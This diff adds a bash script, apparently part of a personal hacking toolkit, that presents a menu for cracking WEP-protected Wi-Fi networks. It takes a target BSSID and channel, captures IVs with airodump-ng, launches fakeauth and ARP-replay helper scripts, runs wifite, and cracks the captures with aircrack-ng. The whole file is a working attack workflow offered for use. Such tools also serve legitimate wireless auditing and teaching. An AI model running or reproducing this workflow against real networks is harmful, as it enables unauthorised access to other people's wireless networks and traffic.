@@ -1,0 +1,95 @@
+#! /bin/bash
+WLANNM=$(cat /root/lscript/wlanmon.txt)
+export WLANNM
+echo -e "---------------------------\e[1;33mWEP hacking\e[0m---------------------------"
+if [ ! -z ${WEPB+x} ]
+then
+	echo -e "BSSID: $WEPB"
+else
+	echo -e "Target's BSSID not set"
+fi
+if [ ! -z ${WEPC+x} ]
+then
+	echo -e "Channel: $WEPC"
+else
+	echo -e "Target's channel not set"
+fi
+echo -e "\e[1;33mw\e[0m) WifiTe                           All attacks"
+echo -e "\e[1;33m1\e[0m) Scan for nearby networks"
+echo -e "\e[1;33m2\e[0m) Start capturing ivs"
+echo -e "\e[1;33m3\e[0m) Fakeauth-arpreplay               If no clients connected"
+echo -e "\e[1;33m4\e[0m) Fakeauth-fragmentation           soon"
+echo -e "\e[1;33m5\e[0m) Chop-chop                        soon"
+echo -e "\e[1;33m6\e[0m) Aircrack the ivs"
+echo -e "\e[1;33m00\e[0m) Main menu"
+echo -e "\e[1;33m 0\e[0m) EXIT"
+echo -e "Choose: "
+read WEP
+if [ "$WEP" = "1" ]
+then
+	clear
+	airodump-ng $WLANNM
+elif [ "$WEP" = "2" ]
+then
+	WEP=-1
+	echo -e "Enter your target's bssid: "
+	read -e WEPB
+	echo -e "Enter your target's channel: "
+	read -e WEPC
+	echo -e "Enter the name of the file(no extension): "
+	echo -e "(don't use the same name twice)"
+	read -e WEPF
+	WEPFF="/root/handshakes/WEP/$WEPF-01.cap"
+	export WEPB
+	export WEPC
+	export WEPF
+	export WEPFF
+	gnome-terminal -e lh41
+elif [ "$WEP" = "w" ]
+then
+	clear
+	wifite
+elif [ "$WEP" = "3" ]
+then
+	gnome-terminal -e lh43
+	gnome-terminal -e lh42
+#~ elif [ "$WEP" = "4" ]
+#~ then
+	#~ clear
+#~ elif [ "$WEP" = "5" ]
+#~ then
+	#~ clear
+elif [ "$WEP" = "6" ]
+then
+	aircrack-ng $WEPFF
+elif [ "$WEP" = "0" ]
+then
+	clear
+	exit
+elif [ "$WEP" = "00" ]
+then
+	clear
+	exec bash "$0"
+else 
+	echo -e "I can't do that bro..."
+	sleep 2
+	clear
+	echo -e "Let's try again..."
+	sleep 1
+	exec bash "$0"
+fi
+echo -e "Choose again?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=yes): "
+read -e CAG
+if [ "$CAG" = "n" ]
+then
+	clear
+	exit
+else
+	if [ "$WEP" = "1" ]
+		then
+		exec bash "$0"
+	else
+		clear
+		exec bash "$0"
+	fi
+fi
